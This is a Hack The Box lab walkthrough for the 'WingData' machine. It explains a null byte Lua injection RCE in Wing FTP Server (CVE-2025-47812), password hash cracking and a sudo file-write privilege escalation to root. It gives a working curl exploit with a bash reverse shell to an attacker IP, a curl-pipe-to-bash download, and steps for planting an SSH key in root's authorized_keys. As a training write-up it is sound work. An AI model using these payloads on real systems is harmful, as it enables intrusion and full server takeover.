# HTB WingData — CTF Walkthrough & Theory Notes

**Machine:** WingData | **Difficulty:** Easy | **OS:** Linux  
**CVE:** CVE-2025-47812 (Null Byte RCE) | **Goal:** Capture `user.txt` and `root.txt`

---

## A) Attack Overview

> Full attack chain at a glance before diving into each phase.

```
[Scan] nmap finds port 80 (Wing FTP Web Interface)
   ↓
[Enumerate] Identify Wing FTP Server v7.4.3 (vulnerable version)
   ↓
[Exploit] CVE-2025-47812 — Null Byte Injection in login field
          → Lua code injected into session file on disk
          → Session file executed by server → Reverse shell (wingftp user)
   ↓
[Pivot] Find password hash in Wing FTP database
        → Crack hash with hashcat / john
        → SSH as local system user
   ↓
[PrivEsc] sudo -l reveals runnable Python/Bash script
          → Analyze script for arbitrary file write flaw
          → Write attacker SSH key to /root/.ssh/authorized_keys
   ↓
[ROOT] SSH as root → capture root.txt
```

### Tools Reference

|Tool|Purpose|
|---|---|
|`nmap`|Port scan — discover open services and versions|
|`gobuster` / `ffuf`|Web directory and endpoint discovery|
|`curl` / Burp Suite|Craft and send malicious HTTP requests|
|`netcat (nc)`|Catch incoming reverse shell connections|
|`ssh`|Stable authenticated shell access|
|`linpeas.sh`|Automated privilege escalation enumeration|
|`hashcat` / `john`|Offline password hash cracking|
|`sqlite3`|Query Wing FTP's internal SQLite database|
|`python3`|Shell stabilization and local HTTP server|

---

## B) Phase 1 — Reconnaissance

### Theory: Why Recon Matters

Reconnaissance is the foundation of any penetration test. Before sending a single exploit, an attacker maps the target to understand:

- What ports are open (attack surface)
- What software is running and its version (vulnerability matching)
- What web endpoints exist (injection points, login forms)

Skipping thorough recon leads to missed vulnerabilities and wasted effort on wrong attack paths.

---

### B.1 — Host File Configuration

```bash
echo "10.129.x.x  wingdata.htb ftp.wingdata.htb" >> /etc/hosts
```

**Why this step is required:**  
Web servers often use <mark style="background:#FFA500">virtual hosting</mark> — serving different content depending on the `Host:` HTTP header. Without mapping the hostname locally, your browser and tools will resolve to the wrong vhost or get a default page that hides the actual application.

---

### B.2 — Nmap Port Scan

```bash
nmap -sC -sV -p- -T4 10.129.x.x
```

**Flag Breakdown:**

|Flag|Meaning|
|---|---|
|`-sC`|Run default NSE scripts (banner grabbing, common checks)|
|`-sV`|Probe open ports to determine service version|
|`-p-`|Scan all 65535 ports (not just top 1000)|
|`-T4`|Aggressive timing — faster scan on stable networks|

**Expected Output:**

```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 9.2p1 Debian
80/tcp open  http     Apache httpd 2.4.66
```

**Analyst Interpretation:**

|Port|Service|Significance|
|---|---|---|
|22|SSH|Login target after credential recovery|
|80|HTTP (Apache)|Primary attack surface — web application|

> Port 443 (HTTPS) is absent — the application runs over plain HTTP, meaning traffic is unencrypted and credentials can be intercepted in transit.

---

### B.3 — Web Enumeration & Version Fingerprinting

Navigate to `http://wingdata.htb` → observe a Wing FTP Server dashboard.  
Click **Client Portal** → redirects to `http://ftp.wingdata.htb/` → login page.

**Critical observation:** The page footer displays `Wing FTP Server v7.4.3`

**Why version numbers matter:**  
<mark style="background:#FF5555">Version disclosure</mark> allows an attacker to directly search for known CVEs. Version 7.4.3 maps to **CVE-2025-47812** — a pre-authentication Remote Code Execution vulnerability. No credentials are needed to exploit it.

**Directory Enumeration (supplemental):**

```bash
gobuster dir -u http://ftp.wingdata.htb/ -w /usr/share/wordlists/dirb/common.txt
```

---

## C) Phase 2 — Exploitation (CVE-2025-47812)

### Theory: Null Byte Injection

<mark style="background:#FFA500">Null Byte Injection</mark> (`\0` / `%00`) is a class of vulnerability that exploits a fundamental difference between how languages handle string termination:

|Language / Runtime|Null Byte (`\0`) Behavior|
|---|---|
|C / C++|Terminates a string — everything after `\0` is invisible|
|Lua|Does not treat `\0` as special — reads full buffer|
|PHP (old versions)|File extensions: `shell.php%00.jpg` bypasses extension checks|
|Python|Raises an exception or passes through depending on context|

**In Wing FTP's case:**

Wing FTP Server is partially written in C/C++ for its core networking layer but uses <mark style="background:#9B59B6">Lua</mark> as its scripting engine for session logic. This creates a dangerous language boundary.

---

### Theory: Session Files as Code

When a user authenticates, Wing FTP writes a session file to disk in Lua format:

```lua
-- /tmp/sessions/abc123.lua (example)
Session = {
  username = "alice",
  ip = "1.2.3.4",
  authenticated = true,
}
```

When the user requests a page (e.g., `dir.html`), the server calls:

```lua
dofile("/tmp/sessions/abc123.lua")
```

This means the session file is **executed as code**, not merely read as data. Any Lua syntax injected into the username field will be run by the interpreter.

**This is the core flaw:** User-controlled input is written to an executable file without proper sanitization.

---

### Theory: The Null Byte Bypass Mechanism

The validation path (C layer) and the write path (raw buffer) diverge:

```
Input:    admin%00"]]..os.execute('id')..[[
                │
                ▼
C Validator:  reads "admin" then stops at \0 → PASSES validation
                │
                ▼  
File Write:   writes entire raw buffer to disk → admin\0"]]..os.execute('id')..[[
                │
                ▼
Lua dofile(): ignores \0, reads full content → executes os.execute('id')
```

**Visual Attack Flow:**

```
Step 1 — Attacker POSTs crafted username to /loginok.html
          username = admin%00"]]..os.execute('reverse shell payload')..[[

Step 2 — C-layer validation: sees "admin", passes ✓

Step 3 — Session file written to disk with full malicious content

Step 4 — Attacker requests session-linked page (dir.html) with session cookie

Step 5 — Lua dofile() loads session file and EXECUTES injected code

Step 6 — Reverse shell callback to attacker's nc listener
```

---

### C.1 — Start Netcat Listener

> Open a separate terminal before sending the exploit payload.

```bash
nc -lvnp 4444
```

|Flag|Meaning|
|---|---|
|`-l`|Listen mode — wait for incoming connection|
|`-v`|Verbose — display connection info|
|`-n`|No DNS resolution — faster, avoids leaking queries|
|`-p 4444`|Bind to port 4444|

---

### C.2 — Get Your VPN IP

```bash
ip a show tun0
```

The `tun0` interface is your HTB VPN address. This is the IP the target machine will connect back to.

---

### C.3 — Craft the Malicious Login Request

**Payload structure (username field):**

```
admin%00"]]..os.execute('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"')..[[
```

**Payload component breakdown:**

|Component|Role|
|---|---|
|`admin`|Valid username prefix — passes C-layer validation|
|`%00`|URL-encoded null byte — terminates the C string|
|`"]]`|Closes the Lua string literal that wraps the username|
|`..os.execute(...)..`|Lua string concatenation + execute system command|
|`[[`|Opens a new Lua long string to swallow trailing syntax|
|`bash -i >& /dev/tcp/IP/PORT 0>&1`|Bash reverse shell — redirects stdio over TCP|

**Send via curl:**

```bash
curl -s -X POST http://ftp.wingdata.htb/loginok.html \
  --data-urlencode 'username=admin%00"]]..os.execute('\''bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"'\'')..[[' \
  --data 'password=anything'
```

---

### C.4 — Trigger Execution

```bash
# Extract the session cookie from the login response, then:
curl http://ftp.wingdata.htb/dir.html --cookie "session=<session_id>"
```

This triggers `dofile()` on the poisoned session file, executing your reverse shell payload.

---

### C.5 — Catch and Stabilize the Shell

**Switch to your nc terminal — you should see:**

```
connect to [10.10.14.X] from (UNKNOWN) [10.129.x.x] XXXXX
bash: no job control in this shell
wingftp@wingdata:/$ 
```

**Shell Stabilization (critical — do this immediately):**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background
stty raw -echo; fg
```

**Why stabilize?**

|Issue with raw shell|Solution after stabilization|
|---|---|
|`Ctrl+C` kills the connection|Sends SIGINT to running process only|
|No tab completion|Full readline support enabled|
|Commands break on screen resize|`stty` syncs terminal dimensions|
|No clear / vi support|`TERM=xterm` enables terminal emulation|

---

## D) Phase 3 — Internal Enumeration & User Pivot

### D.1 — Capture User Flag

```bash
find / -name "user.txt" 2>/dev/null
cat /home/*/user.txt
```

---

### D.2 — Hunt for Credentials in Wing FTP Files

Wing FTP stores application data under `/opt/wingftp/` or `/var/lib/wingftp/`.

```bash
ls -la /opt/wingftp/
find /opt/wingftp/ -name "*.db" -o -name "*.conf" -o -name "*.xml" 2>/dev/null
find / -name "*.db" 2>/dev/null
```

**Querying the SQLite database:**

```bash
sqlite3 /path/to/found.db ".tables"
sqlite3 /path/to/found.db "SELECT * FROM users;"
```

**What you are looking for:**  
A <mark style="background:#FF5555">password hash</mark> for a local Linux system user account — typically MD5, SHA1, or bcrypt format depending on the Wing FTP version.

---

### D.3 — Identify and Crack the Hash

**Step 1 — Save the hash:**

```bash
echo "PASTE_HASH_HERE" > hash.txt
```

**Step 2 — Identify hash type:**

|Hash Format|Example|ID Method|
|---|---|---|
|MD5|`5f4dcc3b5aa765d61d8327deb882cf99`|32 hex chars, no prefix|
|SHA1|`5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8`|40 hex chars|
|SHA256|`5e884898...`|64 hex chars|
|bcrypt|`$2a$10$...`|`$2a$` / `$2b$` prefix|
|Wing FTP MD5|Often stored as plain MD5|Check hashcat --identify|

**Step 3 — Crack with hashcat:**

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
# Or specify mode explicitly:
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt  # SHA1
```

**Or with john:**

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
```

**Why rockyou.txt?**  
The `rockyou.txt` wordlist contains ~14 million passwords from a real-world data breach. CTF machines almost always use passwords found in this list — cracking typically completes in seconds for MD5/SHA1 hashes.

---

### D.4 — SSH In as System User

```bash
ssh username@10.129.x.x
# Enter cracked password when prompted
```

**Why move from reverse shell to SSH?**

|Reverse Shell|SSH Session|
|---|---|
|Fragile — drops on network hiccup|Persistent authenticated connection|
|No file transfer capability|`scp` / `sftp` available|
|Limited terminal features|Full PTY, history, tab completion|
|No reconnection|Can reconnect at any time with same credentials|

---

## E) Phase 4 — Privilege Escalation to Root

### Theory: Linux Privilege Escalation Fundamentals

<mark style="background:#FFA500">Privilege escalation</mark> (PrivEsc) is the process of moving from a lower-privileged account to a higher one — typically targeting `root` (UID 0), which has unrestricted access to the entire system.

**Common PrivEsc vectors:**

|Vector|Description|
|---|---|
|`sudo` misconfigurations|Running commands as root without password|
|SUID/SGID binaries|Executables that run with owner's privileges|
|Writable cron jobs|Cron jobs running as root with world-writable scripts|
|Weak file permissions|Sensitive files readable by low-privilege users|
|Kernel exploits|Unpatched kernel with local privilege escalation CVE|
|Arbitrary file write|Root-owned script that writes attacker-controlled content|

---

### E.1 — Check Sudo Permissions

```bash
sudo -l
```

**What to look for:**

```
(ALL) NOPASSWD: /path/to/some_script.py
```

This output means: "You can run `/path/to/some_script.py` as root without providing a password."  
This is the target.

---

### E.2 — Run LinPEAS for Full Enumeration

**On your attack machine — serve LinPEAS:**

```bash
python3 -m http.server 8000
```

**On the target — download and execute:**

```bash
curl http://10.10.14.X:8000/linpeas.sh | bash
```

**What LinPEAS checks:**

|Category|What It Finds|
|---|---|
|Sudo rules|NOPASSWD entries, dangerous allowed commands|
|SUID binaries|Files with the setuid bit set|
|Cron jobs|Root cron entries with writable script paths|
|World-writable paths|Directories or files any user can modify|
|Interesting files|Config files, DB files, SSH keys, `.bash_history`|
|Network info|Listening internal services (only accessible locally)|

Focus on output highlighted in **red/yellow** — these are LinPEAS's highest-confidence findings.

---

### Theory: Arbitrary File Write Privilege Escalation

If a script executable as root allows user-controlled input to determine:

1. **What content is written** — or —
2. **Where content is written**

...then an attacker can write arbitrary files to sensitive system locations.

**Common targets for arbitrary file write:**

|Target File|Impact|
|---|---|
|`/root/.ssh/authorized_keys`|Passwordless SSH login as root|
|`/etc/sudoers`|Grant current user full sudo access|
|`/etc/passwd`|Add new root-level user|
|`/etc/cron.d/malicious`|Schedule code execution as root|

---

### E.3 — Analyze the Vulnerable Script

```bash
cat /path/to/vulnerable_script
```

Read carefully for:

- Does it accept a filename or path as argument?
- Does it write content to a location derived from user input?
- Is there any path traversal validation (e.g., checking for `..`)?
- Does it call `open()`, `write()`, `shutil.copy()` with user-controlled paths?

**Example vulnerable pattern in Python:**

```python
import sys, os

destination = sys.argv[1]          # user-controlled path
content = sys.argv[2]              # user-controlled content

with open(destination, 'w') as f:
    f.write(content)               # writes anywhere on filesystem as root
```

A script like this, executable via `sudo`, lets you write any content to any file.

---

### E.4 — Generate SSH Key Pair

```bash
ssh-keygen -t rsa -b 4096 -f ./root_key -N ""
cat root_key.pub    # Copy the full public key string
```

This generates a private key (`root_key`) and public key (`root_key.pub`). You will write the public key to the root account's authorized_keys file.

---

### E.5 — Exploit Script for File Write

```bash
# Example — actual parameters depend on the specific script's logic
sudo /path/to/vulnerable_script "/root/.ssh/authorized_keys" "$(cat root_key.pub)"
```

**What this does:**  
Runs the script as root, instructing it to write your public key to root's SSH directory. The SSH daemon will then accept your private key for authentication.

---

### E.6 — SSH in as Root

```bash
ssh root@10.129.x.x -i root_key
```

```
root@wingdata:~# whoami
root
root@wingdata:~# cat /root/root.txt
HTB{YOUR_ROOT_FLAG_HERE}
```

---

## F) Key Concepts Reference

|Concept|Technical Explanation|
|---|---|
|<mark style="background:#FFA500">Null Byte Injection</mark>|`\0` terminates C strings but is transparent to Lua — causes validation bypass across language boundary|
|<mark style="background:#FF5555">Session Poisoning</mark>|Writing attacker-controlled Lua code into server-side session files which are later executed|
|<mark style="background:#9B59B6">Lua Code Execution</mark>|Wing FTP uses `dofile()` to load session state — any Lua syntax in the file runs at load time|
|<mark style="background:#3498DB">Pre-Auth RCE</mark>|Vulnerability exploitable without valid credentials — maximum severity (CVSS critical)|
|<mark style="background:#FFA500">Hash Cracking</mark>|Offline dictionary attack — comparing stored hash against hashes of wordlist candidates|
|<mark style="background:#FF5555">Arbitrary File Write</mark>|Root script writes user-controlled content to user-controlled path — enables full system takeover|
|<mark style="background:#9B59B6">SSH Key Auth</mark>|Placing attacker's public key in `authorized_keys` grants passwordless access using matching private key|
|<mark style="background:#3498DB">sudo NOPASSWD</mark>|Sudo rule allowing specific commands to be run as root without password prompt — high-value PrivEsc vector|

---

## G) Quick Command Reference

```bash
# Environment setup
echo "10.129.x.x wingdata.htb ftp.wingdata.htb" >> /etc/hosts

# Reconnaissance
nmap -sC -sV -p- -T4 10.129.x.x
gobuster dir -u http://ftp.wingdata.htb/ -w /usr/share/wordlists/dirb/common.txt

# Exploit preparation
nc -lvnp 4444
ip a show tun0

# Shell stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg

# Post-exploitation enumeration
find / -name "user.txt" 2>/dev/null
find / -name "*.db" 2>/dev/null
sqlite3 /path/to/found.db "SELECT * FROM users;"

# Hash cracking (local machine)
echo "HASH" > hash.txt
hashcat hash.txt /usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Stable access
ssh username@10.129.x.x

# Privilege escalation enumeration
sudo -l
curl http://YOUR_IP:8000/linpeas.sh | bash

# SSH key generation
ssh-keygen -t rsa -b 4096 -f ./root_key -N ""
cat root_key.pub

# Root access
ssh root@10.129.x.x -i root_key
cat /root/root.txt
```

---

_HTB WingData | CVE-2025-47812 — Null Byte Injection → Lua RCE → Hash Cracking → Sudo Arbitrary File Write → Root_



## Related Topics


- [[QA - Scanning Scenarios]]
- [[Phases of Ethical Hacking]]
- [[Nmap - Complete Guide]]
- [[MOC - Tools]]
- [[QA - Reconnaissance Scenarios]]
